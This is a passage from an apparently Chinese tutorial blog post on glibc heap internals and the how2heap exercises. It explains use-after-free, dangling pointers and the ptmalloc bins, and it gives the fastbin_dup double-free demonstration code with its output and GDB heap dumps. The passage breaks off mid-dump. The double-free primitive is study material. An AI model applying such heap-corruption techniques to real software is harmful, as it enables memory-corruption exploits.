class="comment">//如果我们重新使用了第一次分配的内存空间，现在里面存储的是第三次分配的数据</span></span><br></pre></td></tr></table></figure><p>这个程序的意思就是我们在申请了第一次内存地址后，Free掉再申请一次的话，得到了之前分配得到的内存地址，运行效果</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/tmp$ ./a.out</span><br><span class="line">    </span><br><span class="line">This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.</span><br><span class="line">    </span><br><span class="line">glibc uses a first-fit algorithm to select a <span class="built_in">free</span> chunk.</span><br><span class="line">    </span><br><span class="line">If a chunk is <span class="built_in">free</span> <span class="keyword">and</span> large enough, <span class="built_in">malloc</span> will select <span class="keyword">this</span> chunk.</span><br><span class="line">    </span><br><span class="line">This can be exploited in a use-after-<span class="built_in">free</span> situation.</span><br><span class="line">    </span><br><span class="line">Allocating <span class="number">2</span> buffers. They can be large, don't have to be fastbin.</span><br><span class="line">    </span><br><span class="line">1st malloc(512): 0x85bf008</span><br><span class="line">    </span><br><span class="line">2nd malloc(256): 0x85bf210</span><br><span class="line">    </span><br><span class="line">we could <span class="keyword">continue</span> mallocing here...</span><br><span class="line">    </span><br><span class="line">now let's put a <span class="built_in">string</span> at a that we can read later <span class="string">"this is A!"</span></span><br><span class="line">    </span><br><span class="line">first allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is A!</span><br><span class="line">    </span><br><span class="line">Freeing the first one...</span><br><span class="line">    </span><br><span class="line">We don't need to <span class="built_in">free</span> anything again. As <span class="keyword">long</span> as we allocate less than <span class="number">512</span>, it will end up at <span class="number">0x85bf008</span></span><br><span class="line">    </span><br><span class="line">So, let's allocate <span class="number">500</span> bytes</span><br><span class="line">    </span><br><span class="line">3rd malloc(500): 0x85bf008</span><br><span class="line">    </span><br><span class="line">And put a different <span class="built_in">string</span> here, <span class="string">"this is C!"</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>rd allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is C!</span><br><span class="line">    </span><br><span class="line">first allocation <span class="number">0x85bf008</span> points to <span class="keyword">this</span> is C!</span><br><span class="line">    </span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure><p>从这里</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1st malloc(512): 0x85bf008</span><br><span class="line">3rd malloc(500): 0x85bf008</span><br></pre></td></tr></table></figure><p>我们可以发现两个指针指向了同一个地址</p><p>然后我们在GDB里面逐步分析，第一次malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x804854c</span> &lt;main+<span class="number">129</span>&gt;       add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x804854f</span> &lt;main+<span class="number">132</span>&gt;       sub    esp, <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048552</span> &lt;main+<span class="number">135</span>&gt;       push   <span class="number">0x200</span></span><br><span class="line">→  <span class="number">0x8048557</span> &lt;main+<span class="number">140</span>&gt;       call   <span class="number">0x8048390</span> &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line">  ↳   <span class="number">0x8048390</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">0</span>&gt;   jmp    DWORD PTR ds:<span class="number">0x804a014</span></span><br><span class="line">      <span class="number">0x8048396</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">6</span>&gt;   push   <span class="number">0x10</span></span><br><span class="line">      <span class="number">0x804839b</span> &lt;<span class="built_in">malloc</span>@plt+<span class="number">11</span>&gt;  jmp    <span class="number">0x8048360</span></span><br><span class="line">      <span class="number">0x80483a0</span> &lt;__libc_start_main@plt+<span class="number">0</span>&gt; jmp    DWORD PTR ds:<span class="number">0x804a018</span></span><br><span class="line">      <span class="number">0x80483a6</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt; push   <span class="number">0x18</span></span><br><span class="line">      <span class="number">0x80483ab</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt; jmp    <span class="number">0x8048360</span></span><br></pre></td></tr></table></figure><p>返回的Chunk地址就在EAX寄存器里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$eax   : <span class="number">0x0804b008</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$ebx   : <span class="number">0x0</span>       </span><br><span class="line">$ecx   : <span class="number">0xf7fb2780</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$edx   : <span class="number">0x0804b008</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esp   : <span class="number">0xffffd040</span>  →  <span class="number">0x00000200</span></span><br><span class="line">$ebp   : <span class="number">0xffffd068</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esi   : <span class="number">0xf7fb2000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$edi   : <span class="number">0xf7fb2000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$eip   : <span class="number">0x0804855c</span>  →  &lt;main+<span class="number">145</span>&gt; add esp, <span class="number">0x10</span></span><br><span class="line">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: <span class="number">0x0023</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x002b</span> $es: <span class="number">0x002b</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0063</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x208</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">520</span> (<span class="number">0x208</span>)</span><br><span class="line">Usable size: <span class="number">516</span> (<span class="number">0x204</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>下一次malloc地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">→   <span class="number">14</span> <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="number">15</span> <span class="keyword">char</span>* c;</span><br><span class="line">    <span class="number">16</span> </span><br><span class="line">    <span class="number">17</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="number">18</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="number">19</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd040</span>│+<span class="number">0x0000</span>: <span class="number">0x0804b008</span>  →  <span class="string">"this is A!"</span> ← $esp</span><br><span class="line"><span class="number">0xffffd044</span>│+<span class="number">0x0004</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffffd048</span>│+<span class="number">0x0008</span>: <span class="number">0x00000019</span></span><br><span class="line"><span class="number">0xffffd04c</span>│+<span class="number">0x000c</span>: <span class="number">0xf7fb2cc0</span>  →  <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0xffffd050</span>│+<span class="number">0x0010</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffffd054</span>│+<span class="number">0x0014</span>: <span class="number">0x0804b008</span>  →  <span class="string">"this is A!"</span></span><br><span class="line"><span class="number">0xffffd058</span>│+<span class="number">0x0018</span>: <span class="number">0x0804b210</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd05c</span>│+<span class="number">0x001c</span>: <span class="number">0x08048731</span>  →  &lt;__libc_csu_init+<span class="number">33</span>&gt; lea eax, [ebx<span class="number">-0xf8</span>]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x208</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">520</span> (<span class="number">0x208</span>)</span><br><span class="line">Usable size: <span class="number">516</span> (<span class="number">0x204</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>第三次malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x1f8</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">504</span> (<span class="number">0x1f8</span>)</span><br><span class="line">Usable size: <span class="number">500</span> (<span class="number">0x1f4</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>简单的说，<strong>Use After Free</strong> 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 <strong>NULL</strong> ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 <strong>NULL</strong> ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 <strong>NULL</strong>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer（ 悬空指针 ）</strong></p><p><strong>野指针(wild pointer)</strong>就是没有被初始化过的指针， 悬空指针是指针最初指向的内存已经被释放了的一种指针</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1094457-20170227195731329-810447033.png" alt></p><p>无论是野指针还是悬空指针，都是<strong>指向无效内存区域(这里的无效指的是”不安全不可控”)的指针</strong>。 访问”不安全可控”(<strong>invalid</strong>)的内存区域将导致”<strong>Undefined Behavior</strong>“</p><p>在程序的执行过程中，我们称由 <strong>malloc</strong> 申请的内存为 <strong>chunk</strong> 。这块内存在 <strong>ptmalloc</strong> 内部用 <strong>malloc_chunk</strong> 结构体来表示。当程序申请的 <strong>chunk</strong> 被 <strong>free</strong> 后，会被加入到相应的空闲管理列表中。</p><p>非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><p>用户 free 掉的内存并不是都会马上归还给系统，<strong>ptmalloc 会统一管理 heap 和 mmap 映射区中空闲的 chunk</strong>，当用户进行下一次分配请求时，ptmalloc 会在空闲的 chunk 中选择一个合适的分配给他，这样就避免了频繁地系统调用</p><p><strong>ptmalloc</strong> 把大小相似的 <strong>chunk</strong>，用双向链表连接起来，这样就形成了一个 <strong>bin</strong>。<strong>ptmalloc</strong> 一共维护了 128 个这样的 <strong>bin</strong>，并使用数组来存储这些 bin 如下：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/15548795-49ecc4bc156e439a.png" alt></p><h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p> 默认情况下（<strong>32 位系统为例</strong>）， <strong>fastbin</strong> 中默认支持最大的 <strong>chunk</strong> 的数据空间大小为 64  字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， <strong>fastbin</strong> 最多可以支持的 <strong>bin</strong> 的个数为 10  个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 <strong>prev_size</strong> 和 <strong>size</strong>  字段部分的大小）定义如下 </p><p>用户很有可能请求小的内存，而且释放之后也很可能再次请求小内存。所以合并释放小内存，并不明智。在 <strong>fast</strong> <strong>bins</strong> 中，不大于 <strong>max_fast</strong> （默认值为 64B）的 <strong>chunk</strong> 被释放后，首先会被放到 <strong>fast bins</strong> 中，<strong>fast bins</strong> 中的 <strong>chunk</strong> 并不改变它的使用标志 <strong>P</strong>。这样也就无法将它们合并，当需要给用户分配的 <strong>chunk</strong> 小于或等于 <strong>max_fast</strong> 时，<strong>ptmalloc</strong> 首先会在 <strong>fast bins</strong> 中查找相应的空闲块，如果找不到，才会去 <strong>bins</strong>（那个数组）中查找数据块。</p><p>在某个特定的时刻，<strong>ptmalloc 会遍历整个 fast bins 将相邻的空闲 chunk 进行合并，并将合并后的 chunk 加入 unsorted bin 中，再加入到其他的 bin 中</strong></p><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>如果被用户释放的 <strong>chunk</strong> 或在 <strong>fast bins</strong> 中合并的 <strong>chunk</strong> 大于 <strong>max_fast</strong>，则 <strong>ptmalloc</strong> 会把这些 <strong>chunk</strong> 放入 <strong>unsorted bin</strong> 中。在查找合适的 <strong>chunk</strong> 的时候，首先在 <strong>unsorted bin</strong> 中查找合适的空闲 <strong>chunk</strong>，然后才查找 <strong>bins</strong>。</p><p><strong>如果 unsorted bin 中没有合适的 chunk，</strong>则会把 <strong>unsorted bin</strong> 中的 <strong>chunk</strong> 加入到 <strong>bins</strong> 的其他 <strong>bin</strong> 中，再进行查找</p><h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>数组中的第一个<strong>bin</strong>是 <strong>unsorted bin</strong>，数组中从第 2 个到第 64 个 <strong>bin</strong> 是 <strong>small bin</strong>,它的 <strong>chunk size</strong> 依次递增 <strong>8bytes</strong>，每个<strong>small bin</strong>中的<strong>chunk</strong>大小相同。 <strong>small bins</strong> 中每个 <strong>chunk</strong> 的大小与其所在的 <strong>bin</strong> 的 <strong>index</strong> 的关系为：<strong>chunk_size = 2 * SIZE_SZ *index</strong>，具体如下 </p><table><thead><tr><th>下标</th><th>SIZE_SZ=4（32 位）</th><th>SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2<em>4</em>x</td><td>2<em>8</em>x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><p><strong>small bin</strong> 是一个双向链表。双向链表不是循环链表，它是有顺序的。<strong>在相同大小 chunk 的 bin 中 的排序是按照「最近使用」的顺序，也就是说，排在后面的最容易被选中，刚被释放的放在前面</strong></p><h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p><strong>small bin</strong> 后面是 <strong>large bin</strong>，<strong>largin bin</strong>中 <strong>chunk</strong> 的大小不是固定的，而是有一个范围。其中的顺序是按大小排序的，越大的放在越下面，如果大小相同，<strong>按照「最近使用」的顺序</strong>， <strong>large bins</strong> 中一共包括 63 个 <strong>bin</strong>，每个 <strong>bin</strong> 中的 <strong>chunk</strong> 的大小不一致，而是处于一定区间范围内。此外，这 63 个 <strong>bin</strong> 被分成了 6 组，每组 <strong>bin</strong> 中的 <strong>chunk</strong> 大小之间的公差一致，具体如下： </p><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64B</td></tr><tr><td>2</td><td>16</td><td>512B</td></tr><tr><td>3</td><td>8</td><td>4096B</td></tr><tr><td>4</td><td>4</td><td>32768B</td></tr><tr><td>5</td><td>2</td><td>262144B</td></tr><tr><td>6</td><td>1</td><td>不限制</td></tr></tbody></table><p>当空闲的 <strong>chunk</strong> 被连接到 <strong>bin</strong> 的时候，<strong>ptmalloc</strong> 会把表示该 <strong>chunk</strong> 是否正在使用的标志 <strong>p</strong> 设置为 0。（<strong>注意！这个标志实际处在下一个 chunk 中</strong>）。同时，<strong>ptmalloc</strong> 还会检查它前后（物理前后）的 <strong>chunk</strong> 是否为空，如果为空，<strong>ptmalloc</strong> 会把这些 <strong>chunk</strong> 合并成一个大的 <strong>chunk</strong>，然后把合并后的 <strong>chunk</strong> 放入 <strong>unsorted bin</strong> 中。但是对于较小的 <strong>chunk</strong>，<strong>ptmalloc</strong> 会把它放入 <strong>fast bins</strong> 中。</p><p>这个示例中，在64位系统中，分配的内存大小应该都属于<strong>Small Bin</strong>，我们第一次<strong>Free</strong>，<strong>chunk</strong>到了<strong>bin</strong>中的<strong>Small Bin</strong>，然后我们再次分配内存的时候，就会再次得到第一次分配的内存</p><h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><p>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &lt;stdlib.h</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"><span class="comment">//这个程序展示了一个利用fastbin进行的简单double-free攻击.</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="comment">//先分配三块内存.</span></span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="comment">//free掉第一块内存…</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">    <span class="comment">//如果我们再free第一块内存a的话,程序就会崩溃,然后报错.因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到.</span></span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">    <span class="comment">//所以我们另外free一个,我们free第二块内存b.</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">    <span class="comment">//现在我们再次free第一块内存,程序不会崩溃，因为它已经不在链表顶部了.</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">    <span class="comment">//现在我们的free-list有这三块内存[a,b,a].</span></span><br><span class="line">    <span class="comment">//如果我们malloc三次的话,我们就会得到a两次!</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/tmp$ ./a.out</span><br><span class="line">This file demonstrates a simple <span class="keyword">double</span>-<span class="built_in">free</span> attack with fastbins.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line">1st malloc(8): 0x83b5008</span><br><span class="line">2nd malloc(8): 0x83b5018</span><br><span class="line">3rd malloc(8): 0x83b5028</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we <span class="built_in">free</span> <span class="number">0x83b5008</span> again, things will crash because <span class="number">0x83b5008</span> is at the top of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll free 0x83b5018.</span><br><span class="line">Now, we can <span class="built_in">free</span> <span class="number">0x83b5008</span> again, since it's <span class="keyword">not</span> the head of the <span class="built_in">free</span> <span class="built_in">list</span>.</span><br><span class="line">Now the free list has [ 0x83b5008, 0x83b5018, 0x83b5008 ]. If we malloc 3 times, we'll get 0x83b5008 twice!</span><br><span class="line">1st malloc(8): 0x83b5008</span><br><span class="line">2nd malloc(8): 0x83b5018</span><br><span class="line">3rd malloc(8): 0x83b5008</span><br></pre></td></tr></table></figure><p>GDB调试分析</p><p>第一次malloc：a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b008</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>第二次malloc：b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b018</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>第三次malloc：c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunk <span class="number">0x0804b028</span></span><br><span class="line">Chunk(addr=<span class="number">0x804b028</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)</span><br><span class="line">Chunk size: <span class="number">16</span> (<span class="number">0x10</span>)</span><br><span class="line">Usable size: <span class="number">12</span> (<span class="number">0xc</span>)</span><br><span class="line">Previous chunk size: <span class="number">0</span> (<span class="number">0x0</span>)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>第一次free，a已经并入了fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span 